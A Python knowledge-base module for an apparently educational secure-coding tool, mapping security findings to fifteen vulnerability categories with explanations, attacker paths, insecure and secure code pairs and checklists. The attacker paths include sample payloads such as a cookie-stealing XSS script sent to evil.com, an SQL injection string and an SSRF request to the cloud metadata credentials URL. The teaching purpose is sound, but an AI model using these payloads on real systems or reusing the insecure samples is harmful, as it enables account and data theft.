"""
Category Knowledge Model — SecureTrail Learning System
=======================================================
Structured, deterministic knowledge base for vulnerability categories.
Does NOT depend on AI — always available, always consistent.

Each category maps to:
  - Plain-language explanation
  - Why it matters
  - Attacker exploitation path
  - Secure coding pattern + example
  - Prevention checklist
  - Semgrep/CWE mapping for auto-categorisation
"""

from __future__ import annotations
from typing import Final

# ── Category keys (canonical slugs) ──────────────────────────────────────────
CAT_ACCESS_CONTROL   = "access_control"
CAT_IDOR             = "idor"
CAT_INJECTION        = "injection"
CAT_DEPENDENCY       = "dependency"
CAT_SECRET           = "secret_management"
CAT_RATE_LIMITING    = "rate_limiting"
CAT_CORS             = "cors"
CAT_JWT              = "jwt"
CAT_FILE_UPLOAD      = "file_upload"
CAT_CRYPTO           = "crypto"
CAT_DESERIALIZATION  = "deserialization"
CAT_XSS              = "xss"
CAT_SSRF             = "ssrf"
CAT_LOGGING          = "logging"
CAT_GENERIC          = "generic"

# ── Keyword/CWE → category mapping (for auto-classification) ─────────────────
CATEGORY_SIGNAL_MAP: Final[dict[str, str]] = {
    # Access control
    "broken-access-control": CAT_ACCESS_CONTROL,
    "authorization":          CAT_ACCESS_CONTROL,
    "privilege-escalation":   CAT_ACCESS_CONTROL,
    "cwe-284":                CAT_ACCESS_CONTROL,
    "cwe-285":                CAT_ACCESS_CONTROL,
    # IDOR
    "idor":       CAT_IDOR,
    "bola":       CAT_IDOR,
    "object-level": CAT_IDOR,
    "cwe-639":    CAT_IDOR,
    # Injection
    "sql-injection":    CAT_INJECTION,
    "sqli":             CAT_INJECTION,
    "command-injection":CAT_INJECTION,
    "injection":        CAT_INJECTION,
    "cwe-89":           CAT_INJECTION,
    "cwe-77":           CAT_INJECTION,
    # Dependency
    "dependency":          CAT_DEPENDENCY,
    "outdated-package":    CAT_DEPENDENCY,
    "vulnerable-library":  CAT_DEPENDENCY,
    "cve-":                CAT_DEPENDENCY,
    # Secrets
    "secret":         CAT_SECRET,
    "hardcoded":      CAT_SECRET,
    "api-key":        CAT_SECRET,
    "private-key":    CAT_SECRET,
    "password":       CAT_SECRET,
    "token":          CAT_SECRET,
    "cwe-798":        CAT_SECRET,
    "cwe-312":        CAT_SECRET,
    # Rate limiting
    "rate-limit":    CAT_RATE_LIMITING,
    "brute-force":   CAT_RATE_LIMITING,
    "throttle":      CAT_RATE_LIMITING,
    # CORS
    "cors":        CAT_CORS,
    "origin":      CAT_CORS,
    # JWT
    "jwt":       CAT_JWT,
    "json-web":  CAT_JWT,
    "cwe-347":   CAT_JWT,
    # File upload
    "file-upload":  CAT_FILE_UPLOAD,
    "mime-type":    CAT_FILE_UPLOAD,
    "upload":       CAT_FILE_UPLOAD,
    "cwe-434":      CAT_FILE_UPLOAD,
    # Crypto
    "weak-crypto":  CAT_CRYPTO,
    "md5":          CAT_CRYPTO,
    "sha1":         CAT_CRYPTO,
    "des":          CAT_CRYPTO,
    "cwe-327":      CAT_CRYPTO,
    # Deserialization
    "deserialization": CAT_DESERIALIZATION,
    "pickle":          CAT_DESERIALIZATION,
    "marshal":         CAT_DESERIALIZATION,
    "cwe-502":         CAT_DESERIALIZATION,
    # XSS
    "xss":              CAT_XSS,
    "cross-site":       CAT_XSS,
    "script-injection": CAT_XSS,
    "cwe-79":           CAT_XSS,
    # SSRF
    "ssrf":               CAT_SSRF,
    "server-side-request":CAT_SSRF,
    "cwe-918":            CAT_SSRF,
    # Logging
    "logging":    CAT_LOGGING,
    "audit":      CAT_LOGGING,
    "cwe-778":    CAT_LOGGING,
}


def classify_finding(finding: dict) -> str:
    """
    Classify a single finding dict to a category slug.
    Checks: category field, rule_id, title, description — in that order.
    Falls back to CAT_GENERIC.
    """
    search_text = " ".join([
        (finding.get("category") or ""),
        (finding.get("rule_id") or ""),
        (finding.get("title") or ""),
        (finding.get("description") or ""),
    ]).lower()

    for signal, cat in CATEGORY_SIGNAL_MAP.items():
        if signal in search_text:
            return cat
    return CAT_GENERIC


# ── Full knowledge entries ────────────────────────────────────────────────────
CATEGORY_KNOWLEDGE: Final[dict[str, dict]] = {

    CAT_ACCESS_CONTROL: {
        "id":    CAT_ACCESS_CONTROL,
        "label": "Broken Access Control",
        "icon":  "ShieldOff",
        "color": "#ef4444",
        "plain_explanation": (
            "Access control decides who can do what in your app. "
            "When broken, users can access resources or actions they shouldn't — "
            "like reading another user's data or performing admin-level actions."
        ),
        "why_it_matters": (
            "OWASP ranks this #1. A single missing authorization check can expose "
            "millions of records or allow a regular user to become an admin."
        ),
        "attacker_path": [
            "Discover an API endpoint (e.g. GET /api/users/1234/profile)",
            "Change the ID to another user's ID: GET /api/users/9999/profile",
            "If no server-side check, data is returned — full account takeover",
        ],
        "secure_pattern": (
            "Always verify ownership server-side: "
            "assert resource.owner_id == current_user.id. "
            "Never trust client-supplied IDs without an ownership check."
        ),
        "code_example": {
            "bad":  "profile = db.get_user(request.params.user_id)",
            "good": "profile = db.get_user_owned_by(request.params.user_id, current_user.id)",
        },
        "checklist": [
            "Every endpoint checks authentication AND authorisation",
            "Server-side ownership verification on all resource access",
            "No reliance on client-supplied role/permission flags",
            "Deny by default — explicit grants only",
            "Log and alert on access denial patterns",
        ],
        "cwe_refs": ["CWE-284", "CWE-285", "CWE-639"],
    },

    CAT_IDOR: {
        "id":    CAT_IDOR,
        "label": "IDOR / BOLA",
        "icon":  "Eye",
        "color": "#f97316",
        "plain_explanation": (
            "Insecure Direct Object Reference (IDOR) happens when your API accepts "
            "a user-supplied ID and directly queries data without checking whether "
            "the requesting user owns that record."
        ),
        "why_it_matters": (
            "IDOR is the most common API vulnerability. An attacker with one valid "
            "account can enumerate all other users' data by cycling through IDs."
        ),
        "attacker_path": [
            "Attacker registers a legitimate account",
            "Makes a normal request, intercepts: GET /api/invoices/1001",
            "Iterates: GET /api/invoices/1002 … 9999",
            "Downloads every other user's invoice without authorisation",
        ],
        "secure_pattern": (
            "Use indirect references (opaque UUIDs) and always filter queries "
            "by the authenticated user's tenant/owner ID, not just the resource ID."
        ),
        "code_example": {
            "bad":  "SELECT * FROM invoices WHERE id = ?",
            "good": "SELECT * FROM invoices WHERE id = ? AND user_id = current_user.id",
        },
        "checklist": [
            "All DB queries include owner/tenant constraint",
            "UUIDs preferred over sequential integer IDs",
            "Automated tests with cross-user access attempts",
            "Rate-limit enumeration attempts",
        ],
        "cwe_refs": ["CWE-639"],
    },

    CAT_INJECTION: {
        "id":    CAT_INJECTION,
        "label": "Injection",
        "icon":  "Terminal",
        "color": "#dc2626",
        "plain_explanation": (
            "Injection attacks occur when untrusted input is concatenated into a "
            "command (SQL, OS shell, LDAP) and executed. The input is treated as "
            "code instead of data."
        ),
        "why_it_matters": (
            "SQL injection can dump an entire database in one request. OS command "
            "injection can give an attacker a shell on your server."
        ),
        "attacker_path": [
            "Find a form or query parameter that feels like it queries data",
            "Insert: ' OR '1'='1 into a username field",
            "If vulnerable, login bypass or full table dump occurs",
            "Advanced: xp_cmdshell in MSSQL for OS command execution",
        ],
        "secure_pattern": (
            "Always use parameterised queries / prepared statements. "
            "Never build queries via string concatenation."
        ),
        "code_example": {
            "bad":  "f\"SELECT * FROM users WHERE name = '{user_input}'\"",
            "good": "cursor.execute('SELECT * FROM users WHERE name = %s', (user_input,))",
        },
        "checklist": [
            "Use ORM or parameterised queries exclusively",
            "Validate and sanitise all user input",
            "Principle of least privilege for DB accounts",
            "Enable WAF rules for injection patterns",
        ],
        "cwe_refs": ["CWE-89", "CWE-77", "CWE-78"],
    },

    CAT_DEPENDENCY: {
        "id":    CAT_DEPENDENCY,
        "label": "Dependency Vulnerabilities",
        "icon":  "Package",
        "color": "#eab308",
        "plain_explanation": (
            "Your app uses third-party packages. If those packages have known CVEs "
            "and you haven't updated, attackers can exploit those CVEs against you."
        ),
        "why_it_matters": (
            "Log4Shell (CVE-2021-44228) affected millions of Java apps via one "
            "vulnerable library. 87% of breaches involve a known vulnerability."
        ),
        "attacker_path": [
            "Attacker checks public CVE databases for your library versions",
            "Finds CVE with public exploit code (e.g. on GitHub)",
            "Runs exploit directly — no custom code required",
        ],
        "secure_pattern": (
            "Pin exact versions, run automated CVE scanning in CI (Trivy, Snyk), "
            "and set up Dependabot or Renovate to auto-PR security updates."
        ),
        "code_example": {
            "bad":  "requests>=2.0  # too broad",
            "good": "requests==2.31.0  # pinned, scan for CVEs in CI",
        },
        "checklist": [
            "Pin all dependency versions",
            "Run Trivy/Grype in CI on every PR",
            "Dependabot or Renovate enabled",
            "Review licence compliance too",
            "SBOM (Software Bill of Materials) generated per release",
        ],
        "cwe_refs": ["CWE-1035", "CWE-937"],
    },

    CAT_SECRET: {
        "id":    CAT_SECRET,
        "label": "Secret Management",
        "icon":  "KeyRound",
        "color": "#8b5cf6",
        "plain_explanation": (
            "Hardcoded secrets — API keys, passwords, tokens — committed to source "
            "control are immediately accessible to anyone with repo access, and "
            "permanently in git history even after deletion."
        ),
        "why_it_matters": (
            "A single leaked AWS key can result in cloud bill of $50 000+ overnight, "
            "complete data exfiltration, and regulatory fines."
        ),
        "attacker_path": [
            "Clone or access the public/private repository",
            "Search commit history: git log -p | grep -i 'api_key\\|secret\\|password'",
            "Extract the credential and authenticate to the target service",
            "Exfiltrate data or escalate privileges",
        ],
        "secure_pattern": (
            "Use environment variables or a secrets manager (AWS Secrets Manager, "
            "HashiCorp Vault, Doppler). Add Gitleaks / truffleHog to pre-commit hooks."
        ),
        "code_example": {
            "bad":  "API_KEY = 'sk-prod-abc123xyz'",
            "good": "import os; API_KEY = os.environ['API_KEY']",
        },
        "checklist": [
            "No secrets in source code or config files",
            "Pre-commit hooks (Gitleaks) block accidental commits",
            "Rotate all existing secrets immediately if found",
            "Use short-lived tokens where possible",
            "Audit secret access logs",
        ],
        "cwe_refs": ["CWE-798", "CWE-312", "CWE-313"],
    },

    CAT_RATE_LIMITING: {
        "id":    CAT_RATE_LIMITING,
        "label": "Rate Limiting",
        "icon":  "Gauge",
        "color": "#06b6d4",
        "plain_explanation": (
            "Without rate limiting, an attacker can send unlimited requests to "
            "authentication endpoints, enabling brute-force attacks, account "
            "enumeration, and resource exhaustion."
        ),
        "why_it_matters": (
            "A 6-digit OTP has 1 million combinations. Without rate limiting, "
            "an attacker can try all of them in minutes."
        ),
        "attacker_path": [
            "Target the login or OTP verification endpoint",
            "Script thousands of requests per second using tools like Hydra",
            "Cycle through common passwords or all OTP values",
            "Gain access when the correct value is found",
        ],
        "secure_pattern": (
            "Apply per-IP and per-account rate limits. "
            "Use exponential back-off, CAPTCHA after N failures, and account lockout."
        ),
        "code_example": {
            "bad":  "# No rate limiting on POST /login",
            "good": "@limiter.limit('5/minute') async def login(): ...",
        },
        "checklist": [
            "Rate limits on all auth endpoints",
            "Per-IP + per-account limits",
            "Progressive delay / lockout after failures",
            "CAPTCHA for high-sensitivity actions",
            "Monitor for burst patterns",
        ],
        "cwe_refs": ["CWE-307", "CWE-799"],
    },

    CAT_CORS: {
        "id":    CAT_CORS,
        "label": "CORS Misconfiguration",
        "icon":  "Globe",
        "color": "#10b981",
        "plain_explanation": (
            "CORS (Cross-Origin Resource Sharing) controls which origins can make "
            "requests to your API. A wildcard (*) or reflected origin allows any "
            "website to make authenticated requests on behalf of your users."
        ),
        "why_it_matters": (
            "A malicious website can silently call your API using a victim's session "
            "cookie, exfiltrating data or performing actions on their behalf."
        ),
        "attacker_path": [
            "Attacker hosts malicious.com",
            "Victim visits malicious.com while logged into target app",
            "JavaScript on malicious.com calls target-api.com/user/profile",
            "Wildcard/reflected CORS allows it — response returned to attacker",
        ],
        "secure_pattern": (
            "Explicitly whitelist exact production origins. "
            "Never reflect the incoming Origin header without validation."
        ),
        "code_example": {
            "bad":  "allow_origins=['*']  # dangerous wildcard",
            "good": "allow_origins=['https://app.youromain.com']  # explicit list",
        },
        "checklist": [
            "Explicit origin whitelist — no wildcards in production",
            "Do not reflect Origin header unconditionally",
            "Use credentials: true only when necessary",
            "Review CORS policy in staging vs production",
        ],
        "cwe_refs": ["CWE-942", "CWE-183"],
    },

    CAT_JWT: {
        "id":    CAT_JWT,
        "label": "JWT Misuse",
        "icon":  "KeySquare",
        "color": "#f43f5e",
        "plain_explanation": (
            "JSON Web Tokens carry identity claims. Misconfigurations — like "
            "accepting the 'none' algorithm, using weak secrets, or skipping "
            "signature validation — allow attackers to forge tokens."
        ),
        "why_it_matters": (
            "A forged JWT gives an attacker any identity they choose, "
            "including admin. Complete authentication bypass."
        ),
        "attacker_path": [
            "Intercept a valid JWT from a legitimate session",
            "Decode the header: change 'alg' to 'none' or 'HS256' with a weak key",
            "Modify the payload: change 'role' to 'admin'",
            "If server accepts it — full admin access",
        ],
        "secure_pattern": (
            "Always validate algorithm explicitly (whitelist RS256 or HS256). "
            "Never accept 'none'. Use strong secrets (>= 256 bits). "
            "Set short expiry (exp) and validate it."
        ),
        "code_example": {
            "bad":  "jwt.decode(token, options={'verify_signature': False})",
            "good": "jwt.decode(token, SECRET, algorithms=['HS256'])",
        },
        "checklist": [
            "Whitelist allowed signing algorithms",
            "Validate exp, nbf, iss, aud claims",
            "Rotate JWT signing keys periodically",
            "Use short-lived tokens + refresh token rotation",
            "Never log JWT in plaintext",
        ],
        "cwe_refs": ["CWE-347", "CWE-345"],
    },

    CAT_FILE_UPLOAD: {
        "id":    CAT_FILE_UPLOAD,
        "label": "File Upload Risks",
        "icon":  "FileWarning",
        "color": "#f59e0b",
        "plain_explanation": (
            "Insecure file upload allows attackers to upload executable scripts "
            "disguised as benign files, which can then be executed on the server."
        ),
        "why_it_matters": (
            "Uploading a .php or .jsp webshell gives an attacker full remote code "
            "execution on your server. Game over."
        ),
        "attacker_path": [
            "Find a file upload endpoint (profile picture, document upload)",
            "Rename malicious.php to malicious.jpg",
            "Upload — server only checks extension, not content",
            "Access uploaded file via URL — PHP executes — attacker has shell",
        ],
        "secure_pattern": (
            "Validate MIME type from file bytes (python-magic), not filename. "
            "Store uploads outside web root. Rename files. Strip metadata."
        ),
        "code_example": {
            "bad":  "if file.filename.endswith('.jpg'): allow_upload()",
            "good": "mime = magic.from_buffer(file.read(2048), mime=True); assert mime in ALLOWED_MIMES",
        },
        "checklist": [
            "Validate MIME type from file bytes",
            "Extension allowlist (not denylist)",
            "Store outside web root / serve via CDN",
            "Rename uploaded files to random UUIDs",
            "Virus/malware scanning for sensitive uploads",
        ],
        "cwe_refs": ["CWE-434", "CWE-351"],
    },

    CAT_CRYPTO: {
        "id":    CAT_CRYPTO,
        "label": "Weak Cryptography",
        "icon":  "Lock",
        "color": "#6366f1",
        "plain_explanation": (
            "Using deprecated algorithms (MD5, SHA-1, DES, RC4) provides "
            "minimal security. Modern hardware can crack MD5 hashes at billions "
            "of hashes per second."
        ),
        "why_it_matters": (
            "Leaked MD5-hashed password databases are cracked within hours "
            "using rainbow tables or GPU brute force."
        ),
        "attacker_path": [
            "Obtain leaked database with MD5-hashed passwords",
            "Use Hashcat/John with rainbow tables",
            "Crack 60–80% of passwords in minutes",
            "Use credentials for account takeover",
        ],
        "secure_pattern": (
            "Passwords: use bcrypt, argon2, or scrypt with a high cost factor. "
            "Hashing: use SHA-256 or SHA-3. "
            "Symmetric encryption: AES-256-GCM."
        ),
        "code_example": {
            "bad":  "hashlib.md5(password.encode()).hexdigest()",
            "good": "import bcrypt; bcrypt.hashpw(password.encode(), bcrypt.gensalt(rounds=12))",
        },
        "checklist": [
            "No MD5 or SHA-1 for security purposes",
            "bcrypt/argon2 for passwords",
            "AES-256-GCM for symmetric encryption",
            "RSA-2048+ or ECDSA-256 for asymmetric",
            "Manage and rotate encryption keys",
        ],
        "cwe_refs": ["CWE-327", "CWE-328", "CWE-916"],
    },

    CAT_DESERIALIZATION: {
        "id":    CAT_DESERIALIZATION,
        "label": "Unsafe Deserialization",
        "icon":  "Unplug",
        "color": "#e879f9",
        "plain_explanation": (
            "Deserializing untrusted data (pickle, marshal, yaml.load) can trigger "
            "arbitrary code execution when the attacker controls the serialized payload."
        ),
        "why_it_matters": (
            "Python pickle deserialization of attacker-controlled data is immediate "
            "remote code execution. No further exploit needed."
        ),
        "attacker_path": [
            "Find an endpoint that deserializes user-supplied data",
            "Craft a malicious pickle payload that calls os.system",
            "Submit payload — server deserializes — code runs as the server process",
        ],
        "secure_pattern": (
            "Never deserialize untrusted data with pickle/marshal. "
            "Use JSON (json.loads) or MessagePack with strict schema validation."
        ),
        "code_example": {
            "bad":  "import pickle; data = pickle.loads(user_input)",
            "good": "import json; data = json.loads(user_input)  # then validate schema",
        },
        "checklist": [
            "Never pickle untrusted input",
            "Use JSON with strict schema (Pydantic)",
            "Validate types/ranges after deserialization",
            "Run deserialization in a sandbox if required",
        ],
        "cwe_refs": ["CWE-502"],
    },

    CAT_XSS: {
        "id":    CAT_XSS,
        "label": "Cross-Site Scripting (XSS)",
        "icon":  "Code2",
        "color": "#f97316",
        "plain_explanation": (
            "XSS injects malicious scripts into web pages viewed by other users. "
            "When executed, the script runs with the victim's session privileges."
        ),
        "why_it_matters": (
            "XSS can steal session cookies, redirect users, keylog passwords, "
            "and deface pages. Stored XSS can affect every user who visits a page."
        ),
        "attacker_path": [
            "Find a form that reflects user input back to the page",
            "Submit: <script>document.location='evil.com?c='+document.cookie</script>",
            "Every victim who views that content has their cookie stolen",
        ],
        "secure_pattern": (
            "Escape all user-supplied output. Use a templating engine that "
            "auto-escapes (Jinja2 with autoescaping on). "
            "Set Content-Security-Policy headers."
        ),
        "code_example": {
            "bad":  "return f'<p>Hello {username}</p>'  # raw interpolation",
            "good": "return render_template('hello.html', username=username)  # auto-escaped",
        },
        "checklist": [
            "Auto-escaping enabled in all templates",
            "Sanitise HTML input with allowlisted tags only",
            "Content-Security-Policy header on all responses",
            "HttpOnly + Secure flags on session cookies",
        ],
        "cwe_refs": ["CWE-79", "CWE-80"],
    },

    CAT_SSRF: {
        "id":    CAT_SSRF,
        "label": "SSRF",
        "icon":  "Server",
        "color": "#0ea5e9",
        "plain_explanation": (
            "Server-Side Request Forgery makes your server request an attacker-"
            "supplied URL. This can probe internal services, cloud metadata APIs, "
            "or exfiltrate data through the server."
        ),
        "why_it_matters": (
            "AWS metadata endpoint (169.254.169.254) exposes IAM credentials via SSRF. "
            "Capital One breach (2019) used SSRF to steal $100M+ of data."
        ),
        "attacker_path": [
            "Find an endpoint that fetches a URL (webhook, preview, import)",
            "Supply: http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "Server fetches it — returns cloud IAM credentials to attacker",
        ],
        "secure_pattern": (
            "Validate and allowlist target URLs. "
            "Block private IP ranges (RFC 1918, link-local). "
            "Use a dedicated egress proxy that enforces the allowlist."
        ),
        "code_example": {
            "bad":  "response = requests.get(user_supplied_url)",
            "good": "assert is_allowed_url(user_supplied_url); response = requests.get(user_supplied_url)",
        },
        "checklist": [
            "URL allowlist enforced server-side",
            "Block private/loopback/link-local IPs",
            "DNS rebinding protection",
            "IMDSv2 enforced on cloud instances",
        ],
        "cwe_refs": ["CWE-918"],
    },

    CAT_LOGGING: {
        "id":    CAT_LOGGING,
        "label": "Insufficient Logging",
        "icon":  "FileText",
        "color": "#94a3b8",
        "plain_explanation": (
            "Without proper logging and alerting, attacks go undetected for months. "
            "The average breach dwell time is 197 days — mostly due to poor logging."
        ),
        "why_it_matters": (
            "You can't respond to what you can't see. Regulators (GDPR, SOC2, HIPAA) "
            "require audit trails. Missing logs also mean no forensic evidence."
        ),
        "attacker_path": [
            "Attacker brute-forces login endpoint",
            "No logging means no alert fires",
            "Attack continues for weeks undetected",
        ],
        "secure_pattern": (
            "Log authentication events, access control failures, and admin actions. "
            "Ship logs to a SIEM. Alert on anomalies."
        ),
        "code_example": {
            "bad":  "# No logging on failed login",
            "good": "logger.warning('Failed login attempt', extra={'user': username, 'ip': ip})",
        },
        "checklist": [
            "Log all auth events (success and failure)",
            "Log access control failures",
            "Centralised log shipping (CloudWatch, Datadog)",
            "Alert thresholds configured",
            "Log retention policy defined",
        ],
        "cwe_refs": ["CWE-778", "CWE-223"],
    },

    CAT_GENERIC: {
        "id":    CAT_GENERIC,
        "label": "Other Security Issues",
        "icon":  "AlertCircle",
        "color": "#64748b",
        "plain_explanation": "Security findings that require manual review.",
        "why_it_matters": "Even uncategorised findings can represent real attack surface.",
        "attacker_path": ["Review each finding individually for exploit potential."],
        "secure_pattern": "Follow the principle of least privilege and defence in depth.",
        "code_example": {"bad": "", "good": ""},
        "checklist": [
            "Review each finding manually",
            "Apply secure coding principles",
            "Consult OWASP guidelines",
        ],
        "cwe_refs": [],
    },
}


def get_knowledge(category: str) -> dict:
    """Return knowledge entry for a category slug (falls back to generic)."""
    return CATEGORY_KNOWLEDGE.get(category, CATEGORY_KNOWLEDGE[CAT_GENERIC])


def get_all_categories() -> list[dict]:
    """Return a minimal list of all categories (id + label + color + icon)."""
    return [
        {
            "id":    v["id"],
            "label": v["label"],
            "icon":  v["icon"],
            "color": v["color"],
        }
        for v in CATEGORY_KNOWLEDGE.values()
        if v["id"] != CAT_GENERIC
    ]
